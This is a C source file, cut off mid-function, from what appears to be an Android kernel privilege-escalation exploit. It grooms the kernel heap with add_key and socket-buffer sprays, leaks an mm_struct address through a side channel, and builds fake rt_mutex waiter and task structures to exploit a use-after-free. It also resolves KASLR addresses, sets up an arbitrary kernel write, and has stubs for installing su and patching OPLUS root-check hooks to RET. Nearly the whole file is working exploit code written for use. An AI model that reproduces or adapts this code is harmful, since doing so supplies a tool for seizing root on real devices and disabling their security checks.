#include "common.h"
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include "kernelsnitch/kernelsnitch.h"
#include <stdarg.h>

// add_key() reclamation primitive
// user_key_payload = 18 byte header + payload
// For kmalloc-128: payload = 110 bytes, total = 128 bytes
#define KEY_PAYLOAD_SIZE 110
#define KEY_SPRAY_COUNT 512

#ifndef __NR_add_key
#define __NR_add_key 217
#endif
#ifndef __NR_keyctl
#define __NR_keyctl 219
#endif

#define KEY_SPEC_PROCESS_KEYRING -2
#define KEYCTL_UNLINK 9

typedef int32_t key_serial_t;

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
static int reclaim_sv[2] = {-1, -1};
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;

uintptr_t page_base;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t pselect_custom_target;
uintptr_t pselect_custom_value;
int pselect_custom_shape;
int direct_root_cpu = -1;

/* Shared workspace info for passing from parent to child */
static struct {
  uintptr_t workspace_page;
  int initialized;
} *shared_workspace_info = NULL;

static cpu_set_t initial_affinity;
static int initial_affinity_valid;

/* -------- persistent, crash-surviving log sink (see utils.h pr_* macros) ----
   The exploit now corrupts kernel state on purpose, so the process can die
   mid-attempt and take logcat with it. Worse, the forked slide child's logd
   fd is clobbered by the pselect fd install, so its lines never reach logcat
   at all; and an untrusted_app is frequently denied READ_LOGS so the launcher
   can't `logcat -d` reliably either. So every pr_* line is also appended to a
   plain file the app can always read back.

   Path: $POC_LOG_FILE if the launcher set it (it does), else derived from the
   loaded libpreload.so mapping (same dir, "preload.log"), else a tmp fallback.
   The fd is opened once, early (before any fd spray), duplicated to a high
   number (>=900) so the slide/fops fd-install dup2 loops — which only touch
   fds 0..~449 — cannot clobber it, and inherited across fork so child lines
   are captured. O_APPEND accumulates across runs. write() alone survives a
   userspace crash; flush=1 (pr_error/pr_success) also fsyncs for reboot/panic. */
static int poc_log_fd = -1; /* -1 = unopened, -2 = permanently failed */

static void poc_log_build_path(char *out, size_t outsz) {
  out[0] = 0;
  const char *env = getenv("POC_LOG_FILE");
  if (env && env[0]) {
    snprintf(out, outsz, "%s", env);
    return;
  }
  FILE *mf = fopen("/proc/self/maps", "r"); /* closed below; CLOEXEC irrelevant */
  if (mf) {
    char line[512];
    while (fgets(line, sizeof(line), mf)) {
      if (!strstr(line, "libpreload.so")) {
        continue;
      }
      char *slash = strchr(line, '/'); /* pathname starts at the first '/' */
      if (!slash) {
        continue;
      }
      size_t L = strlen(slash);
      while (L && (slash[L - 1] == '\n' || slash[L - 1] == '\r')) {
        slash[--L] = 0;
      }
      char *bn = strrchr(slash, '/');
      if (bn && (size_t)(bn - slash) + sizeof("/preload.log") < outsz) {
        int dirlen = (int)(bn - slash); /* dir without trailing slash */
        snprintf(out, outsz, "%.*s/preload.log", dirlen, slash);
      }
      break;
    }
    fclose(mf);
  }
  if (!out[0]) {
    snprintf(out, outsz, "/data/local/tmp/aristotle_preload.log");
  }
}

void poc_flog(int flush, const char *fmt, ...) {
  if (poc_log_fd == -2) {
    return;
  }
  if (poc_log_fd < 0) {
    char path[256];
    poc_log_build_path(path, sizeof(path));
    int fd = open(path, O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0600);
    if (fd < 0) {
      poc_log_fd = -2;
      return;
    }
    int hi = fcntl(fd, F_DUPFD_CLOEXEC, 900);
    if (hi >= 0) {
      close(fd);
      fd = hi;
    }
    poc_log_fd = fd;
  }

  char buf[1024];
  struct timespec ts;
  clock_gettime(CLOCK_REALTIME, &ts);
  int n = snprintf(buf, sizeof(buf), "%ld.%03ld %d ", (long)ts.tv_sec,
                   ts.tv_nsec / 1000000, (int)getpid());
  if (n < 0) {
    n = 0;
  }
  if (n > (int)sizeof(buf)) {
    n = (int)sizeof(buf);
  }
  va_list ap;
  va_start(ap, fmt);
  int m = vsnprintf(buf + n, sizeof(buf) - (size_t)n, fmt, ap);
  va_end(ap);
  if (m > 0) {
    n += m;
    if (n > (int)sizeof(buf)) {
      n = (int)sizeof(buf);
    }
  }
  (void)!write(poc_log_fd, buf, (size_t)n);
  if (flush) {
    fsync(poc_log_fd);
  }
}

static int read_sysfs_u64(const char *path, uint64_t *out) {
  char buf[64];
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    return 0;
  }
  buf[n] = 0;

  char *end = NULL;
  errno = 0;
  unsigned long long value = strtoull(buf, &end, 10);
  if (errno || end == buf) {
    return 0;
  }
  while (*end == ' ' || *end == '\t' || *end == '\r' || *end == '\n') {
    end++;
  }
  if (*end) {
    return 0;
  }
  *out = (uint64_t)value;
  return 1;
}

int init_direct_root_cpu(void) {
  if (sched_getaffinity(0, sizeof(initial_affinity), &initial_affinity) != 0) {
    return 0;
  }
  initial_affinity_valid = 1;

  long configured = sysconf(_SC_NPROCESSORS_CONF);
  if (configured <= 0 || configured > CPU_SETSIZE) {
    configured = CPU_SETSIZE;
  }

  int best = -1;
  int fallback = -1;
  uint64_t best_freq = 0;
  uint64_t best_capacity = 0;
  for (int cpu = 0; cpu < configured; cpu++) {
    if (!CPU_ISSET(cpu, &initial_affinity)) {
      continue;
    }

    char path[160];
    uint64_t online = 1;
    snprintf(path, sizeof(path),
             "/sys/devices/system/cpu/cpu%d/online", cpu);
    if (read_sysfs_u64(path, &online) && online != 1) {
      continue;
    }
    fallback = cpu;

    uint64_t freq = 0;
    snprintf(path, sizeof(path),
             "/sys/devices/system/cpu/cpu%d/cpufreq/cpuinfo_max_freq", cpu);
    if (!read_sysfs_u64(path, &freq)) {
      snprintf(path, sizeof(path),
               "/sys/devices/system/cpu/cpu%d/cpufreq/scaling_max_freq", cpu);
      if (!read_sysfs_u64(path, &freq)) {
        continue;
      }
    }

    uint64_t capacity = 0;
    snprintf(path, sizeof(path),
             "/sys/devices/system/cpu/cpu%d/cpu_capacity", cpu);
    (void)read_sysfs_u64(path, &capacity);

    if (best < 0 || freq > best_freq ||
        (freq == best_freq && capacity > best_capacity) ||
        (freq == best_freq && capacity == best_capacity && cpu > best)) {
      best = cpu;
      best_freq = freq;
      best_capacity = capacity;
    }
  }

  if (best < 0) {
    int current = sched_getcpu();
    if (current >= 0 && current < CPU_SETSIZE &&
        CPU_ISSET(current, &initial_affinity)) {
      best = current;
    } else {
      best = fallback;
    }
    if (best >= 0) {
      pr_warning("CPU max frequency unavailable; fallback cpu=%d\n", best);
    }
  }
  if (best < 0) {
    errno = ENODEV;
    return 0;
  }

  direct_root_cpu = best;
  pr_success("runtime performance cpu=%d max_freq=%llu capacity=%llu\n",
             best, (unsigned long long)best_freq,
             (unsigned long long)best_capacity);
  return 1;
}

int restore_initial_affinity(void) {
  if (!initial_affinity_valid) {
    errno = EINVAL;
    return 0;
  }
  return sched_setaffinity(
      0, sizeof(initial_affinity), &initial_affinity) == 0;
}

__attribute__((weak))
int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
  errno = ENOSYS;
  return 0;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  pr_success("startup pid=%d uid=%u attr=%s enforce=%s direct_cpu=%d\n",
             getpid(), getuid(), attr, enforce, direct_root_cpu);
}

void log_slide_child_context(void) {
  pr_success("slide child pid=%d uid=%u direct_cpu=%d\n",
             getpid(), getuid(), direct_root_cpu);
}

void disable_rseq_for_thread(void) {
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = SCHED_BATCH;
  attr.sched_nice = nice_value;
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t pselect_write_value(void) {
  return pselect_custom_value;
}

uintptr_t pselect_write_target(void) {
  return pselect_custom_target;
}

int pselect_write_shape(void) {
  return pselect_custom_shape;
}

void set_pselect_write(uintptr_t target, uintptr_t value, int shape) {
  pselect_custom_target = target;
  pselect_custom_value = value;
  pselect_custom_shape = shape;
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

static pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

static pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    pin_to_core((size_t)direct_root_cpu);
    kernelsnitch_find_collisions(ks);
    _exit(0);
  }
  return child;
}

static int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY | O_CLOEXEC));
}

static void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

static void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] >= 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

static void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->memfds);
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

static int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

static void init_ctx(struct mm_ctx *ctx, size_t count) {
  ctx->mm_cnt = count;
  ctx->memfds = malloc(count * sizeof(*ctx->memfds));
  if (!ctx->memfds) {
    pr_error("mm context allocation failed count=%zu\n", count);
  }
  for (size_t i = 0; i < count; i++) {
    ctx->memfds[i] = -1;
  }
}

static void prepare_ctxs(void) {
  init_ctx(&prepare_ctx, 8 * mm_objs_per_slab);
  init_ctx(&spray_ctx, (1 + MM_PARTIALS) * mm_objs_per_slab);
  init_ctx(&pre_ctx, mm_objs_per_slab - 1);
  init_ctx(&post_ctx, mm_objs_per_slab);
}

static void put_direct_waiter(
    unsigned char *p, uintptr_t parent, uintptr_t right,
    uintptr_t left, uint64_t waiter_task) {
  put64(p, W0_OFF + WAITER_TREE_ENTRY_OFF + 0x00, 1);
  put64(p, W0_OFF + WAITER_TREE_ENTRY_OFF + 0x08, 0);
  put64(p, W0_OFF + WAITER_TREE_ENTRY_OFF + 0x10, 0);
  put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x00, parent);
  put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x08, right);
  put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x10, left);
  /* 5.10 flat rt_mutex_waiter: no pi_tree.prio/deadline, no wake_state/ww_ctx.
     Single prio(0x40)/deadline(0x48) after task/lock. */
  put64(p, W0_OFF + WAITER_TASK_OFF, waiter_task);
  put64(p, W0_OFF + WAITER_LOCK_OFF, fake_lock);
  put32(p, W0_OFF + WAITER_PRIO_OFF, FAKE_WAITER_PRIO);
  put64(p, W0_OFF + WAITER_DEADLINE_OFF, 0);
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  if (payload_mode != PAGE_PAYLOAD_SLIDE &&
      payload_mode != PAGE_PAYLOAD_FOPS) {
    return 0;
  }
  memset(skb_buf, 0, SKB_SEND_SIZE);

  uintptr_t payload_base = base + SKB_DATA_DELTA;
  // FAKE STRUCTURE ADDRESSES
  // These are used by the kernel when dereferencing waiter->lock and waiter->task
  //
  // CRITICAL SOLUTION: Use BSS zero page for fake_lock!
  // An all-zero memory region is a valid unlocked rt_mutex:
  //   +0x00: wait_lock = 0  (unlocked spinlock)
  //   +0x08: waiters = 0    (empty rb_root)
  //   +0x18: owner = 0      (no owner)
  // Kernel locks it (0=unlocked), finds no owner (0), unlocks, returns OK.
  
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    // For slide mode, use static kernel addresses
    // fake_task = SLIDE_INIT_TASK (valid task_struct)
    // fake_lock = FAKE_LOCK_STATIC (BSS zero page = valid rt_mutex)
    fake_task = SLIDE_INIT_TASK;
    fake_lock = canon_addr(FAKE_LOCK_STATIC);  // BSS zero page
    fake_w0 = SLIDE_INIT_TASK;  // Point to valid memory
  } else {
    // For fops mode, still need heap addresses (TODO: fix this)
    fake_lock = payload_base + LOCK_OFF;
    fake_w0 = payload_base + W0_OFF;
    fake_task = payload_base + FAKE_TASK_OFF;
  }

  uintptr_t parent;
  uintptr_t right;
  uintptr_t left;
  uint64_t waiter_task;
  uint64_t task_group;
  uint64_t pi_top_task;

  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    parent = SLIDE_LOGGERS_0_1;
    right = 0;
    left = SLIDE_RANDOM_BOOT_ID_DATA;
    waiter_task = SLIDE_INIT_TASK;
    task_group = SLIDE_ROOT_TASK_GROUP;
    pi_top_task = SLIDE_INIT_TASK;
  } else {
    parent = pselect_custom_value;
    right = 0;
    left = pselect_custom_target;
    if (pselect_custom_shape == 1) {
      if (pselect_custom_target < 8) {
        return 0;
      }
      parent = pselect_custom_target - 8;
      right = pselect_custom_value;
      left = 0;
    }
    waiter_task = fake_task;
    task_group = 0;
    pi_top_task = fake_task;
  }

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk;

    put32(p, LOCK_OFF + 0x00, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      put64(p, LOCK_OFF + 0x08, 0);
      put64(p, LOCK_OFF + 0x10, 0);
      put64(p, LOCK_OFF + 0x18, 0);
    } else {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    }

    put_direct_waiter(p, parent, right, left, waiter_task);

    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_REQ_OFF,
          FAKE_UCLAMP_MIN_ACTIVE);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_REQ_OFF + 4,
          FAKE_UCLAMP_MAX_ACTIVE);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_OFF,
          FAKE_UCLAMP_MIN_ACTIVE);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_OFF + 4,
          FAKE_UCLAMP_MAX_ACTIVE);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    } else {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8, 0);
    }
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
  }
  return 1;
}

static uintptr_t prepare_kernel_page(int payload_mode) {
  close_reclaim_sockets();
  cleanup_page_prepare_state();
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  prepare_ctxs();

  skb_buf = malloc(SKB_SEND_SIZE);
  if (!skb_buf) {
    pr_error("skb payload allocation failed\n");
  }

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.memfds[i] = clone_memfd();
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.memfds[i] = clone_memfd();
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 1, 0);  /* verbose=1 */

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = clone_memfd();
  }
  pid_t leak_child = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = clone_memfd();
  }
  int leak_memfd = open_memfd(leak_child);
  SYSCHK(waitpid(leak_child, NULL, 0));

  if (!kernelsnitch_found_collisions(ks)) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    close(leak_memfd);
    cleanup_page_prepare_state();
    return 0;
  }

  kernelsnitch_bruteforce(ks);
  uintptr_t leaked = ks->mm_struct;
  if (leaked == (uintptr_t)-1) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    close(leak_memfd);
    cleanup_page_prepare_state();
    return 0;
  }

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  uintptr_t slab_off = leaked - base;
  size_t leaked_slot = slab_off / MM_STRUCT_SZ;
  if (slab_off % MM_STRUCT_SZ != 0 || leaked_slot >= mm_objs_per_slab ||
      !prepare_skb_payload(base, payload_mode)) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    close(leak_memfd);
    cleanup_page_prepare_state();
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  int sndbuf = 1 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  int flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, flags | O_NONBLOCK);
  }

  int shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, shaping_sv));
  struct iovec iov = {
    .iov_base = skb_buf,
    .iov_len = SKB_RECLAIM_SIZE,
  };
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  if (sendmsg(shaping_sv[0], &msg, 0) != (ssize_t)SKB_RECLAIM_SIZE) {
    close(shaping_sv[0]);
    close(shaping_sv[1]);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    close(leak_memfd);
    close_reclaim_sockets();
    cleanup_page_prepare_state();
    return 0;
  }

  pin_to_core(CORE);
  for (int i = 0; i < 4; i++) {
    sched_yield();
  }
  close_ctx_memfds(&pre_ctx);
  for (size_t i = 0; i + 1 < post_ctx.mm_cnt; i++) {
    close(post_ctx.memfds[i]);
    post_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    close(spray_ctx.memfds[i]);
    spray_ctx.memfds[i] = -1;
  }

  close(shaping_sv[0]);
  close(shaping_sv[1]);
  for (int i = 0; i < 4; i++) {
    sched_yield();
  }
  close(leak_memfd);

  int reclaim_ok = 1;
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    if (sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT) !=
        (ssize_t)SKB_RECLAIM_SIZE) {
      reclaim_ok = 0;
      break;
    }
  }

  kernelsnitch_cleanup(ks);
  ks = NULL;
  close_ctx_memfds(&prepare_ctx);
  if (!reclaim_ok) {
    close_reclaim_sockets();
    cleanup_page_prepare_state();
    return 0;
  }
  return base;
}

// Forward declaration for direct read
extern int direct_read_shape0_exact64_once(uintptr_t slot, uint64_t *value, const char *name, int attempt, int *write_idx);
extern uintptr_t g_entry_slot;

// Helper to read mm_struct from task_struct using direct read primitive
// This runs in the CHILD process after fork, which inherits g_entry_slot
// from the parent. The UAF state is in kernel memory (not process-specific),
// so the child can use the direct read primitive.
static uintptr_t read_mm_struct_from_task(uintptr_t task_addr) {
    if (!g_entry_slot) {
        pr_warning("read_mm_struct: entry slot not initialized (might be early call)\n");
        return 0;
    }
    
    // Read task_struct->mm at offset TASK_MM_OFF
    uintptr_t mm_slot = task_addr + TASK_MM_OFF;
    uint64_t mm_value = 0;
    int write_idx = 0;
    
    // Use the direct read primitive (available in child after fork)
    // Note: This will fork ANOTHER child, which might cause issues
    // For now, just log and return 0 to indicate we need a different approach
    pr_info("read_mm_struct: would read task=%016lx mm_slot=%016lx but skipping to avoid nested fork\n",
            task_addr, mm_slot);
    return 0;
}

// Read mm_struct from kernel memory using root (Magisk)
static uintptr_t read_kernel_u64(uintptr_t addr) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/mem", getpid());
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    
    // This won't work for kernel addresses via /proc/pid/mem...
    close(fd);
    return 0;
}

// Use root to read mm_struct via debugfs or other interface
static uintptr_t get_mm_struct_via_root(void) {
    // Try reading from /sys/kernel/slab/mm_struct/objects if available
    // Or use a Magisk module
    
    // For now, return 0 to indicate failure
    return 0;
}

// add_key() reclamation primitive for kmalloc-128
// pselect6 doesn't work on 4.14 - uses wrong allocation size
// add_key("user", 110 bytes payload) = exactly kmalloc-128
static key_serial_t sprayed_keys[10000];  // Increased for drain
static int key_spray_count = 0;
#define DRAIN_COUNT 6500  // Drain ~6312 free slots + margin

// Phase 1: Drain all free kmalloc-128 slots
int drain_freelist(uintptr_t fake_task_addr, uintptr_t fake_lock_addr) {
    char payload[KEY_PAYLOAD_SIZE];
    memset(payload, 0, sizeof(payload));
    
    // fake_lock_addr is already computed as ENTRY_TASK + cpu*8 - 0x18
    // So fake_lock->owner = *(ENTRY_TASK + cpu*8) = current_task
    
    memcpy(payload + 30, &fake_task_addr, 8);  // waiter->task = current_task
    memcpy(payload + 38, &fake_lock_addr, 8);  // waiter->lock (owner will be current_task)
    *(int*)(payload + 46) = 1;                  // waiter->prio
    
    pr_info("DRAIN: filling freelist with %d keys...\n", DRAIN_COUNT);
    pr_info("  waiter->task = %016zx\n", fake_task_addr);
    pr_info("  waiter->lock = %016zx\n", fake_lock_addr);
    
    int drained = 0;
    for (int i = 0; i < DRAIN_COUNT; i++) {
        sprayed_keys[i] = (key_serial_t)syscall(__NR_add_key, "user", "drain",
                                                  payload, sizeof(payload),
                                                  KEY_SPEC_PROCESS_KEYRING);
        if (sprayed_keys[i] > 0) {
            drained++;
        }
    }
    pr_info("DRAIN: drained %d/%d slots\n", drained, DRAIN_COUNT);
    key_spray_count = drained;
    return drained;
}

static void cleanup_keys(void) {
    for (int i = 0; i < key_spray_count; i++) {
        if (sprayed_keys[i] > 0) {
            syscall(__NR_keyctl, KEYCTL_UNLINK, sprayed_keys[i], KEY_SPEC_PROCESS_KEYRING);
            sprayed_keys[i] = -1;
        }
    }
    key_spray_count = 0;
}

// Legacy function for compatibility
static int spray_keys_with_fake_waiter(uintptr_t fake_task_addr, uintptr_t fake_lock_addr) {
    return drain_freelist(fake_task_addr, fake_lock_addr);
}

// oplus_root_check and oplus_root_reboot addresses (static, from kallsyms)
#define OPLUS_ROOT_CHECK_STATIC    0xffffff80090a0e88ULL
#define OPLUS_ROOT_REBOOT_STATIC   0xffffff80090a0a58ULL

// Patch oplus security hooks to prevent reboot
// Must be called after we have write primitive
static int patch_oplus_hooks(void) {
    // ARM64 RET instruction = 0xd65f03c0
    uint32_t ret_insn = 0xd65f03c0;
    
    uintptr_t root_check_runtime = canon_addr(OPLUS_ROOT_CHECK_STATIC);
    uintptr_t root_reboot_runtime = canon_addr(OPLUS_ROOT_REBOOT_STATIC);
    
    pr_warning("patching oplus hooks:\n");
    pr_warning("  oplus_root_check  = %016zx\n", root_check_runtime);
    pr_warning("  oplus_root_reboot = %016zx\n", root_reboot_runtime);
    
    // We need a kernel write primitive here
    // For now, just print - will be implemented via UAF write
    // TODO: Use direct write primitive once established
    
    return 1;
}

// Spray a single key to reclaim the freed waiter slot after UAF
int spray_reclaim_key(uintptr_t fake_task_addr, uintptr_t fake_lock_addr) {
    char payload[KEY_PAYLOAD_SIZE];
    memset(payload, 0, sizeof(payload));
    
    // fake_lock_addr is pre-computed (ENTRY_TASK + cpu*8 - 0x18)
    memcpy(payload + 30, &fake_task_addr, 8);  // waiter->task = current_task
    memcpy(payload + 38, &fake_lock_addr, 8);  // waiter->lock
    *(int*)(payload + 46) = 1;                  // waiter->prio
    
    pr_info("RECLAIM: spraying key with fake_lock=%016zx\n", fake_lock_addr);
    
    key_serial_t key = (key_serial_t)syscall(__NR_add_key, "user", "reclaim",
                                              payload, sizeof(payload),
                                              KEY_SPEC_PROCESS_KEYRING);
    
    if (key > 0) {
        pr_success("reclaim key sprayed: key=%d\n", key);
        return 1;
    } else {
        pr_error("reclaim key failed: errno=%d\n", errno);
        return 0;
    }
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
#ifdef BYPASS_KERNELSNITCH
  // Use add_key() for kmalloc-128 reclamation
  // Phase 1 (drain) happens in run_main_route_threads_keys BEFORE UAF
  // This function just sets up the globals
  
  uintptr_t slide = kaslr_base - KIMAGE_TEXT_BASE;
  uintptr_t base = P0_DATA_ALIAS_CONST(INIT_CRED_STATIC) & ~0xfffULL;
  
  // Runtime addresses for fake structures
  uintptr_t fake_task_runtime = canon_addr(SLIDE_INIT_TASK_IMAGE);
  
  // CRITICAL: fake_lock points to ENTRY_TASK so that:
  // waiter->lock = ENTRY_TASK - 0x18
  // lock->owner = *(ENTRY_TASK) = current task_struct*
  // This gives us a valid owner for PI chain walk
  uintptr_t entry_task_runtime = canon_addr(ENTRY_TASK);
  
  pr_warning("BYPASS_KERNELSNITCH: add_key grooming mode\n");
  pr_warning("  base=%016zx slide=%016zx\n", base, slide);
  pr_warning("  fake_task=%016zx entry_task=%016zx\n", fake_task_runtime, entry_task_runtime);
  
  // Set fake_* globals - will be used by run_main_route_threads_keys
  fake_task = fake_task_runtime;
  fake_lock = entry_task_runtime;  // ENTRY_TASK, drain will compute ENTRY_TASK-0x18
  fake_w0 = fake_task_runtime;
  
  // Minimal skb_buf (not really used in add_key mode)
  skb_buf = malloc(SKB_SEND_SIZE);
  if (!skb_buf) {
    pr_error("skb allocation failed\n");
    return 0;
  }
  memset(skb_buf, 0, SKB_SEND_SIZE);
  
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;

  // Set up reclaim socket
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  int sndbuf = 1 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  int flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, flags | O_NONBLOCK);
  }
  
  return base;
#else
  int max_attempts = payload_mode == PAGE_PAYLOAD_SLIDE ?
      SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS : FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(payload_mode);
    if (base) {
      return base;
    }
    pr_warning("kernel page retry %d/%d mode=%d\n",
               attempt, max_attempts, payload_mode);
  }
  return 0;
#endif
}

int is_kernel_ptr(uintptr_t value) {
  return value >= 0xffff800000000000ULL;
}

int is_direct_ptr(uintptr_t value) {
